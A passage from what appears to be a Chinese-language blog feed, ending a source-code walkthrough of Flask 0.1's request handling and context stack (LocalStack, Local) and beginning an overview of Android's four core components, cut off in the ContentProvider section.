<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># Flask类函数</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">request_context</span><span class="params">(self, environ)</span>:</span></div><div class="line">        <span class="keyword">return</span> _RequestContext(self, environ)</div><div class="line"><span class="comment"># _RequestContext类</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">_RequestContext</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, app, environ)</span>:</span></div><div class="line">        self.app = app                                           <span class="comment"># Flask app</span></div><div class="line">        self.url_adapter = app.url_map.bind_to_environ(environ)  <span class="comment"># 将ENV绑定到URL Adappter，可以参考werkzeug相关文档说明</span></div><div class="line">        self.request = app.request_class(environ)                <span class="comment"># app.request = Request类，其实就是把environ字典的一些信息封装为Request对象</span></div><div class="line">        self.session = app.open_session(self.request)            <span class="comment"># 从cookie中拿到sessionID，然后读取用户的session</span></div><div class="line">        self.g = _RequestGlobals()                               </div><div class="line">        self.flashes = <span class="keyword">None</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__enter__</span><span class="params">(self)</span>:</span></div><div class="line">        _request_ctx_stack.push(self)</div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__exit__</span><span class="params">(self, exc_type, exc_value, tb)</span>:</span></div><div class="line">        <span class="keyword">if</span> tb <span class="keyword">is</span> <span class="keyword">None</span> <span class="keyword">or</span> <span class="keyword">not</span> self.app.debug:</div><div class="line">            _request_ctx_stack.pop()</div></pre></td></tr></table></figure>
<p>URL Adappter更多，可以点击这里 : <a href="http://werkzeug-docs-cn.readthedocs.io/zh_CN/latest/tutorial.html#step-4" target="_blank" rel="external">Werkzeug 文档说明</a></p>
<p>关于Session和Cookie，我这里多补充几句：</p>
<ol>
<li>Session是在服务端保存的一个数据结构，用来对用户会话进行跟踪的一个机制，根据不同的Session ID来标识不同的用户，这个数据可以保存在集群、数据库、文件中。常见的使用场景，比如购物车等。</li>
<li>Cookie是客户端保存用户信息的一种机制，用来记录用户的一些信息。每次HTTP请求的时候，客户端都会发送相应的Cookie信息到服务端。</li>
<li>Session ID一般是存在Cookie中，所以如果浏览器禁用了Cookie，同时Session 也会失效（但是可以通过其它方式实现，比如在 url 中传递 session_id）</li>
</ol>
<h3 id="4-2-2-预处理preprocess-request"><a href="#4-2-2-预处理preprocess-request" class="headerlink" title="4.2.2 预处理preprocess_request"></a>4.2.2 预处理preprocess_request</h3><p>我们再来看看先调用预处理函数preprocess_request：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">preprocess_request</span><span class="params">(self)</span>:</span> </div><div class="line">    <span class="keyword">for</span> func <span class="keyword">in</span> self.before_request_funcs:  </div><div class="line">        rv = func()</div><div class="line">        <span class="keyword">if</span> rv <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:  </div><div class="line">            <span class="comment"># 如果这些函数中有返回值，则被视为来自试图的返回值，并停止其他函数处理</span></div><div class="line">            <span class="comment"># 预处理函数应当不需要有返回值的，这点需注意</span></div><div class="line">            <span class="keyword">return</span> rv</div></pre></td></tr></table></figure>
<p>会遍历before_request_funcs这个列表的函数并且执行，这个列表函数通过装饰器@app.before_request来赋值：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">before_request</span><span class="params">(self, f)</span>:</span></div><div class="line">    <span class="string">"""Registers a function to run before each request."""</span></div><div class="line">    self.before_request_funcs.append(f)</div><div class="line">    <span class="keyword">return</span> f</div></pre></td></tr></table></figure>
<h3 id="4-2-3-分发请求dispatch-request"><a href="#4-2-3-分发请求dispatch-request" class="headerlink" title="4.2.3 分发请求dispatch_request()"></a>4.2.3 分发请求dispatch_request()</h3><p>简单一句话，这个函数的作用就是匹配到Request对应的URL和视图函数，并执行这个函数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">match_request</span><span class="params">(self)</span>:</span></div><div class="line">    rv = _request_ctx_stack.top.url_adapter.match()  <span class="comment"># self.url_adapter 上文有说明</span></div><div class="line">    <span class="comment"># endpoint 是指函数名</span></div><div class="line">    <span class="comment"># view_args 这里是一个dict，视图参数？？</span></div><div class="line">    request.endpoint, request.view_args = rv         </div><div class="line">    <span class="keyword">return</span> rv</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dispatch_request</span><span class="params">(self)</span>:</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        endpoint, values = self.match_request()         <span class="comment"># 先匹配函数名和参数</span></div><div class="line">        <span class="keyword">return</span> self.view_functions[endpoint](**values)  <span class="comment"># 匹配完后直接执行函数</span></div><div class="line">    </div><div class="line">    <span class="keyword">except</span> HTTPException, e:                            <span class="comment"># 匹配不到视图函数的处理</span></div><div class="line">        handler = self.error_handlers.get(e.code)</div><div class="line">        <span class="keyword">if</span> handler <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">            <span class="keyword">return</span> e</div><div class="line">        <span class="keyword">return</span> handler(e)</div><div class="line">    <span class="keyword">except</span> Exception, e:</div><div class="line">        handler = self.error_handlers.get(<span class="number">500</span>)</div><div class="line">        <span class="keyword">if</span> self.debug <span class="keyword">or</span> handler <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">            <span class="keyword">raise</span></div><div class="line">        <span class="keyword">return</span> handler(e)</div></pre></td></tr></table></figure>
<h3 id="4-2-4-生成response对象"><a href="#4-2-4-生成response对象" class="headerlink" title="4.2.4 生成response对象"></a>4.2.4 生成response对象</h3><p>生成一个response对象，并返回：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># ResponseBase由Werkzeug提供,</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Response</span><span class="params">(ResponseBase)</span>:</span></div><div class="line">    default_mimetype = <span class="string">'text/html'</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_response</span><span class="params">(self, rv)</span>:</span>       </div><div class="line">    <span class="keyword">if</span> isinstance(rv, self.response_class):</div><div class="line">        <span class="keyword">return</span> rv</div><div class="line">    <span class="keyword">if</span> isinstance(rv, basestring):</div><div class="line">        <span class="keyword">return</span> self.response_class(rv)</div><div class="line">    <span class="keyword">if</span> isinstance(rv, tuple):</div><div class="line">        <span class="keyword">return</span> self.response_class(*rv)</div><div class="line">    <span class="keyword">return</span> self.response_class.force_type(rv, request.environ)</div></pre></td></tr></table></figure>
<p>如果不是response对象，则转化response对象，response对象继承自ResponseBase对象，其实就是Response对象。<br>若需要进一步了解，可以访问：<a href="http://werkzeug-docs-cn.readthedocs.io/zh_CN/latest/quickstart.html#response" target="_blank" rel="external">http://werkzeug-docs-cn.readthedocs.io/zh_CN/latest/quickstart.html#response</a></p>
<h3 id="4-2-5-self-process-response-response"><a href="#4-2-5-self-process-response-response" class="headerlink" title="4.2.5 self.process_response(response)"></a>4.2.5 self.process_response(response)</h3><p>生成response对象后，保存session并执行一些request后的函数，最后再返回response对象：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">process_response</span><span class="params">(self, response)</span>:</span>   </div><div class="line">    session = _request_ctx_stack.top.session  <span class="comment"># 从RequestContext中拿到用户的session</span></div><div class="line">    <span class="keyword">if</span> session <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</div><div class="line">        self.save_session(session, response)  <span class="comment"># 保存session</span></div><div class="line">    <span class="keyword">for</span> handler <span class="keyword">in</span> self.after_request_funcs:  </div><div class="line">        response = handler(response)          <span class="comment"># 执行装饰器 @app.after_request 标记的函数</span></div><div class="line">    <span class="keyword">return</span> response                           <span class="comment"># 最后返回response对象</span></div></pre></td></tr></table></figure>
<p>在所有都处理完成后，把需要返回的内容返回给客户端：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">return</span> response(environ, start_response)</div></pre></td></tr></table></figure>
<p>至此，flask 0.1主框架大致分析完成了。</p>
<h1 id="五、Flask-Context机制"><a href="#五、Flask-Context机制" class="headerlink" title="五、Flask Context机制"></a>五、Flask Context机制</h1><p>细心的同学在上面应该注意到了，我们还有一个点没有讲，那就是Flask的Context机制。</p>
<p>Flask 中有分为请求上下文和应用上下文：</p>
<table>
<thead>
<tr>
<th>对象</th>
<th>Context类型</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>current_app</td>
<td>AppContext</td>
<td>当前应用的对象</td>
</tr>
<tr>
<td>g</td>
<td>AppContext</td>
<td>处理请求时用作临时存储的对象</td>
</tr>
<tr>
<td>request</td>
<td>RequestContext</td>
<td>请求request对象</td>
</tr>
<tr>
<td>session</td>
<td>RequestContext</td>
<td>请求的session对象</td>
</tr>
</tbody>
</table>
<p>拉到Flask.py最后面，我们可以看到有以下几行：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">_request_ctx_stack = LocalStack()</div><div class="line">current_app = LocalProxy(<span class="keyword">lambda</span>: _request_ctx_stack.top.app)</div><div class="line">request = LocalProxy(<span class="keyword">lambda</span>: _request_ctx_stack.top.request)</div><div class="line">session = LocalProxy(<span class="keyword">lambda</span>: _request_ctx_stack.top.session)</div><div class="line">g = LocalProxy(<span class="keyword">lambda</span>: _request_ctx_stack.top.g)</div></pre></td></tr></table></figure>
<p>所有的对象都交由request_ctx_stack这个堆栈来管理了。</p>
<h2 id="5-1-LocakStack"><a href="#5-1-LocakStack" class="headerlink" title="5.1 LocakStack()"></a>5.1 LocakStack()</h2><p>LocalStack()会返回一个栈。栈肯定会有push 、pop和top函数，如下所示:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">LocalStack</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="string">"""</span></div><div class="line">        &gt;&gt;&gt; ls = LocalStack()</div><div class="line">        &gt;&gt;&gt; ls.push(42)</div><div class="line">        &gt;&gt;&gt; ls.top</div><div class="line">        42</div><div class="line">        &gt;&gt;&gt; ls.push(23)</div><div class="line">        &gt;&gt;&gt; ls.top</div><div class="line">        23</div><div class="line">        &gt;&gt;&gt; ls.pop()</div><div class="line">        23</div><div class="line">        &gt;&gt;&gt; ls.top</div><div class="line">        42</div><div class="line">    """</div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></div><div class="line">        self._local = Local()</div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">push</span><span class="params">(self, obj)</span>:</span></div><div class="line">        rv = getattr(self._local, <span class="string">'stack'</span>, <span class="keyword">None</span>)</div><div class="line">        <span class="keyword">if</span> rv <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">            self._local.stack = rv = []</div><div class="line">        rv.append(obj)</div><div class="line">        <span class="keyword">return</span> rv</div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pop</span><span class="params">(self)</span>:</span></div><div class="line">        stack = getattr(self._local, <span class="string">'stack'</span>, <span class="keyword">None</span>)</div><div class="line">        <span class="keyword">if</span> stack <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">None</span></div><div class="line">        <span class="keyword">elif</span> len(stack) == <span class="number">1</span>:</div><div class="line">            release_local(self._local)</div><div class="line">            <span class="keyword">return</span> stack[<span class="number">-1</span>]</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">return</span> stack.pop()</div><div class="line"><span class="meta">    @property</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">top</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            <span class="keyword">return</span> self._local.stack[<span class="number">-1</span>]</div><div class="line">        <span class="keyword">except</span> (AttributeError, IndexError):</div><div class="line">            <span class="keyword">return</span> <span class="keyword">None</span></div></pre></td></tr></table></figure>
<p>按照我们的理解，要实现一个栈，那么LocalStack类应该有一个成员变量，是一个list，然后通过 这个list来保存栈的元素。然而，LocalStack并没有一个类型是list的成员变量， LocalStack仅有一个成员变量self._local = Local()。</p>
<p>我们再看push，pop，top函数可以知道，具体是通过self._local.stack这个来实现栈的操作。</p>
<h2 id="5-2-Local"><a href="#5-2-Local" class="headerlink" title="5.2 Local()"></a>5.2 Local()</h2><p>当我们操作self._local.stack时，会调用Local()的getattr和setattr方法。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Local</span><span class="params">(object)</span>:</span></div><div class="line">    __slots__ = (<span class="string">'__storage__'</span>, <span class="string">'__ident_func__'</span>)</div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></div><div class="line">        object.__setattr__(self, <span class="string">'__storage__'</span>, &#123;&#125;)</div><div class="line">        object.__setattr__(self, <span class="string">'__ident_func__'</span>, get_ident)</div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__getattr__</span><span class="params">(self, name)</span>:</span></div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            <span class="keyword">return</span> self.__storage__[self.__ident_func__()][name]</div><div class="line">        <span class="keyword">except</span> KeyError:</div><div class="line">            <span class="keyword">raise</span> AttributeError(name)</div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__setattr__</span><span class="params">(self, name, value)</span>:</span></div><div class="line">        ident = self.__ident_func__()</div><div class="line">        storage = self.__storage__</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            storage[ident][name] = value</div><div class="line">        <span class="keyword">except</span> KeyError:</div><div class="line">            storage[ident] = &#123;name: value&#125;</div></pre></td></tr></table></figure>
<p>Local类有两个成员变量，分别是storage和ident_func，其中，前者 是一个字典，后者是一个函数。<br>这个函数的含义是，获取当前线程的id。</p>
<p>例如，当我们执行：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">request_ctx_stack = LocalStack()</div><div class="line">_request_ctx_stack.push(RequestContext)</div></pre></td></tr></table></figure>
<p>注意，这里赋值的时候，最终会调用：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># name =&gt; stack</span></div><div class="line">self.__storage__[self.__ident_func__()][name] = RequestContext</div></pre></td></tr></table></figure>
<p>所以最终看起来会是这样一个数据结构：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">    &apos;thread_id1&apos;:&#123;&apos;stack&apos;:[_RequestContext()]&#125;,</div><div class="line">    &apos;thread_id2&apos;:&#123;&apos;stack&apos;:[_RequestContext()]&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>至此，Flask0.1版本的源码已经大致分析完成，其实如果继续下去的话，还有很多值得深究的地方，待后续有时间继续深入分析。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Flask是一个使用 Python 编写的轻量级 Web 应用框架。其 WSGI 工具箱采用 Werkzeug ，模板引擎则使用 Jinja2 。&lt;/p&gt;
    
    </summary>
    
      <category term="Python进阶" scheme="https://maoao530.github.io/categories/Python%E8%BF%9B%E9%98%B6/"/>
    
    
      <category term="Flask" scheme="https://maoao530.github.io/tags/Flask/"/>
    
  </entry>
  
  <entry>
    <title>Android四大组件</title>
    <link href="https://maoao530.github.io/2016/08/11/android-base/"/>
    <id>https://maoao530.github.io/2016/08/11/android-base/</id>
    <published>2016-08-11T01:59:38.000Z</published>
    <updated>2017-01-31T05:45:19.488Z</updated>
    
    <content type="html"><![CDATA[<p>复习Android四大组件内容。</p>
<a id="more"></a>
<p>本文会总结介绍Android组件中最为常见用的四大组件：Activity，Service服务,ContentProvider内容提供者，BroadcastReceiver广播接收者。</p>
<h1 id="一、Activity"><a href="#一、Activity" class="headerlink" title="一、Activity"></a>一、Activity</h1><p>在一个android应用中，一个Activity通常就是一个单独的屏幕，它上面可以显示一些控件也可以监听并处理用户的事件做出响应。Activity之间通过Intent进行通信。</p>
<h2 id="1-1-主要函数"><a href="#1-1-主要函数" class="headerlink" title="1.1 主要函数"></a>1.1 主要函数</h2><p><img src="/img/archives/activity-main.png" alt="主要函数"></p>
<h2 id="1-2-生命周期"><a href="#1-2-生命周期" class="headerlink" title="1.2 生命周期"></a>1.2 生命周期</h2><p><img src="/img/archives/activity-shengming-zhouqi.png" alt="生命周期"></p>
<h2 id="1-3-AndroidManifest-xml文件配置"><a href="#1-3-AndroidManifest-xml文件配置" class="headerlink" title="1.3 AndroidManifest.xml文件配置"></a>1.3 AndroidManifest.xml文件配置</h2><p>需要在apk的AndroidManifest配置文件中进行配置：</p>
<p><img src="/img/archives/activity-androidmanifest.png" alt="配置"></p>
<h2 id="1-4-Activity管理"><a href="#1-4-Activity管理" class="headerlink" title="1.4 Activity管理"></a>1.4 Activity管理</h2><p>activity在android里面是以栈的形式管理的，处于前台的 Activity 总是在栈的顶端，当前台的 Activity 因为异常或其它原因被销毁时，处于栈第二层的 Activity 将被激活，上浮到栈顶。当新的 Activity 启动入栈时，原 Activity 会被压入到栈的第二层。如下：</p>
<p><img src="/img/archives/activity-stack.png" alt="activity管理"></p>
<h2 id="1-5-通信"><a href="#1-5-通信" class="headerlink" title="1.5 通信"></a>1.5 通信</h2><ol>
<li>activity之间通过Intent进行通信，可以将数据放入Bundle中，再将Bundle放入intent中，实现数据通信。</li>
<li>可以通过intent去启动一个activity，方式有显示Intent和隐式Intent。<br>2.1 显示<br>直接指明启动的Activity类：Context.startActivity(new Intent(this,xxx.class))<br>2.2 隐式<br>需要在Activity对应的AndroidManifest.xml中配置对应的Intent-Filter中的action和category，一般默认category属性需要有一个default属性(如果有其它category则不用添加此属性)：<code>&lt;category android:name=”android.Intent.Category.DEFAULT” /&gt;</code><br>这是因为Android把所有传给startActivity()的隐式意图当作他们包含至少一个类别<code>&quot;android.intent.category.DEFAULT&quot;</code> </li>
</ol>
<p><img src="/img/archives/activity-intent.png" alt="intent通信"></p>
<h1 id="二、Service"><a href="#二、Service" class="headerlink" title="二、Service"></a>二、Service</h1><p>Service作为Android四大组件之一，在每一个应用程序中都扮演着非常重要的角色。它主要用于在后台处理一些耗时的逻辑，或者去执行某些需要长期运行的任务。必要的时候我们甚至可以在程序退出的情况下，让Service在后台继续保持运行状态。</p>
<h2 id="2-1-生命周期"><a href="#2-1-生命周期" class="headerlink" title="2.1 生命周期"></a>2.1 生命周期</h2><p>Service生命周期函数比较简单：</p>
<p><img src="/img/archives/service-shengming-zhouqi.png" alt="service生命周期"></p>
<h2 id="2-2-Local-Remote-Service"><a href="#2-2-Local-Remote-Service" class="headerlink" title="2.2 Local/Remote Service"></a>2.2 Local/Remote Service</h2><ol>
<li><p>service分为<code>local service</code> 和 <code>remote service</code>，本地服务的生命周期是和主进程相关的，主进程结束的时候service也结束了，远程服务则为独立的进程和主进程没有关系。</p>
</li>
<li><p>local service 使用bindService启动service，用unBindService关闭service</p>
</li>
<li><p>remote service 使用startService和stopService启动和关闭Service</p>
</li>
<li><p><strong>通信：</strong><br>4.1 Local service ：是运行在主进程的main线程下的，在同一个进程，通信的方式通过返回一个IBinder，然后比如说可以在ui线程中去接收ibinder进行通信，可以吧。<br>4.2 Remote service：因为是独立进程，所以如果需要和其它进程进行通信，则需要通过aidl进行ipc通信</p>
</li>
<li><p>如果需要比较耗时的操作，可以在service中开一个新的线程进行操作，避免阻塞ui线程产生anr，或者使用IntentService，因为IntentService会开启单独的线程来处理所有的Intent请求</p>
</li>
</ol>
<p>关于Service其他本文不做过多说明，都是一些比较常用的知识。</p>
<h1 id="三、BroadcastReceiver"><a href="#三、BroadcastReceiver" class="headerlink" title="三、BroadcastReceiver"></a>三、BroadcastReceiver</h1><p>BroadcastReceiver即广播接受者，是一种全局的监听器，可以用来作为不同组件之间的通信，比如说activity和service之间的通信可以借助其实现。</p>
<h2 id="3-1-启动方式"><a href="#3-1-启动方式" class="headerlink" title="3.1 启动方式"></a>3.1 启动方式</h2><p>Context.sendBroadcast() 或者Context.sendOrderedBroadcast()</p>
<h2 id="3-2-接收方式"><a href="#3-2-接收方式" class="headerlink" title="3.2 接收方式"></a>3.2 接收方式</h2><p>重写BroadcastReceiver的onReceive()方法</p>
<h2 id="3-3-实现方式"><a href="#3-3-实现方式" class="headerlink" title="3.3 实现方式"></a>3.3 实现方式</h2><p>BoradcastReceiver实现方式有两种，一是通过代码注册，二是通过Androidmanifest.xml方式配置：</p>
<p>方式一，代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">IntentFilter   filter  =   <span class="keyword">new</span> IntentFilter(“xxx.xxx.xxx.xxxAction”);</div><div class="line">XxxReceiver   receiver  =  XxxReceiver();</div><div class="line">Context.registerReceiver( receiver,filter);</div></pre></td></tr></table></figure>
<p>方式二，Androidmanifest.xml<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt; receiver android:name = ".XxxReceiver" &gt;</div><div class="line">    &lt; intent-filter  android:priority=”1000”&gt;         </div><div class="line">        &lt; action android:name = " xxx.xxx.xxx.xxxAction" /&gt;</div><div class="line">    &lt;/ intent-filter &gt;</div><div class="line">&lt;/ receiver &gt;</div></pre></td></tr></table></figure></p>
<p>每次广播事件发生后，系统会创建对应的BroadcastReceiver实例，并且去触发onReceive方法，这个方法执行完毕后，BroadcastReceiver实例会被销毁，因为BroadcastReceiver生命周期短，超过10s会产生anr对话框，所以不要在onReceive里面做一些耗时的操作，如果需要耗时操作，可以用Intent开启一个Service来完成而不是开启一个新的子线程去完成，因为可能子线程还没结束，BroadcastReceiver就已经结束退出了。</p>
<h2 id="3-4-普通广播和有序广播"><a href="#3-4-普通广播和有序广播" class="headerlink" title="3.4 普通广播和有序广播"></a>3.4 普通广播和有序广播</h2><ol>
<li><p>普通广播：<br>普通广播是完全异步的，即发送一个广播，所有注册了action相同的BroadcastReceiver都能同时接收到，传递的效率比较高。</p>
</li>
<li><p>有序广播：<br>顾名思义，需要设置广播的顺序，设置的方式有两种，一种是在代码中：IntentFilter.setPriority(Int  order)设置，一种是在AndroidManifest.xml中设置&lt; intent-filter  android:priority=”1000”&gt;，order值范围为[-1000, 1000]，1000为最高优先级，也就是说当你发送了一个广播，优先级高的BroadcastReceiver会先接收，然后传递给下一个优先级低的BroadcastReceiver，层层传递，然后还可以在优先级高的终止广播的往下传递，或者可以向下一个广播传递新的数据信息，具体方式如下<br>优先级高的广播发送信息：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Bundle bundle = <span class="keyword">new</span> Bundle();</div><div class="line">bundle.putString(“info”,”优先级高的就是爽！！”);</div><div class="line">setResultExtras(bundle);</div><div class="line"><span class="comment">// 甚至可以取消广播继续传递</span></div><div class="line"><span class="comment">// abortBroadcast()</span></div><div class="line">优先级低的接收信息：</div><div class="line">Bundle bundle = getResultExtras(<span class="keyword">true</span>);</div><div class="line">String info = bundle.getString(“info”);</div></pre></td></tr></table></figure>
</li>
</ol>
<h1 id="四、ContentProvider"><a href="#四、ContentProvider" class="headerlink" title="四、ContentProvider"></a>四、ContentProvider</h1><p>ContentProvider即内容提供者，简单来讲它的作用就是将一个app的数据提供给其它app进行操作，比如增删改查等。<br>一个典型的例子，比如说我们会经常遇到有应用软件需要读取手机的联系人，这时候就需要联系人应用的ContentProvider功能提供数据的crud操作。<br>ContentProvider的功能是提供数据的增删改查，而其它应用想访问ContentProvider的crud操作，则需要通过ContentResolver的增删改查功能实现，通过uri作为媒介，比如其它应用想去读取联系人，则模型如下：</p>
<p><img src="/img/archives/contentprovider-model.png" alt="ContentProvider-Model"></p>
<h2 id="4-1-URI"><a href="#4-1-URI" class="headerlink" title="4.1 URI"></a>4.1 URI</h2><p>uri由三部分组成，协议+主机名+路径：</p>
<ul>
<li><strong>scheme：</strong> ContentProvider（内容提供者）的scheme已经由Android所规定为：<code>content://</code>。  </li>
<li><strong>主机名（或Authority）：</strong> 用于唯一标识这个ContentProvider，外部调用者可以根据这个标识来找到它。</li>
<li><strong>路径（path）：</strong>可以用来表示我们要操作的数据，路径的构建应根据业务而定，如下：要操作contact表中id为10的记录，可以构建这样的路径<br>: <code>/contact/10</code></li>
</ul>
<p>一个uri例子：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">content://com.shun.provider.myapp/contact/2</div></pre></td></tr></table></figure></p>
<p>如果要把一个字符串转换成Uri，可以使用Uri类中的parse()方法，如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Uri uri = Uri.parse(<span class="string">"content://com.changcheng.provider.contactprovider/contact"</span>)</div></pre></td></tr></table></figure>
<h2 id="4-2-实现ContentProvider"><a href="#4-2-实现ContentProvider" class="headerlink" title="4.2 实现ContentProvider"></a>4.2 实现ContentProvider</h2><p>实现一个ContentProvider有两个步骤：</p>
<ol>
<li>开发一个ContentProvider的子类，然后去实现它的<code>query</code>，<code>delete</code>，<code>update</code>，<code>insert</code>方法，然后还要使用<code>UriMatcher</code>对uri进行匹配过滤</li>
<li>在androidmanifest.xml中配置它，需要指定android:authorities方法（唯一主机名）<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;provider android:name=&quot;MyProvider&quot; android:authorities=&quot; com.shun.provider.myapp &quot; /&gt;</div></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="4-3-ContentResolver"><a href="#4-3-ContentResolver" class="headerlink" title="4.3 ContentResolver"></a>4.3 ContentResolver</h2><p>ContentResolver的使用则比较简单了：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Context.getContentResolver().query(…)</div><div class="line">Context.getContentResolver().delete(…)</div><div class="line">Context.getContentResolver().update(…)</div><div class="line">Context.getContentResolver().insert(…)</div></pre></td></tr></table></figure></p>
<p>当然，上面这些个crud方法返回值肯定不一样，具体参考google官网</p>
<h2 id="4-4-ContentObserver"><a href="#4-4-ContentObserver" class="headerlink" title="4.4 ContentObserver"></a>4.4 ContentObserver</h2><p>ContentObserver即内容观察者，可以监听ContentProvider数据的改变，实现一个内容观察者步骤如下：</p>
<ol>
<li>实现一个ContentObserver的子类，实现onChange()方法，每当有数据改变时会触发此方法</li>
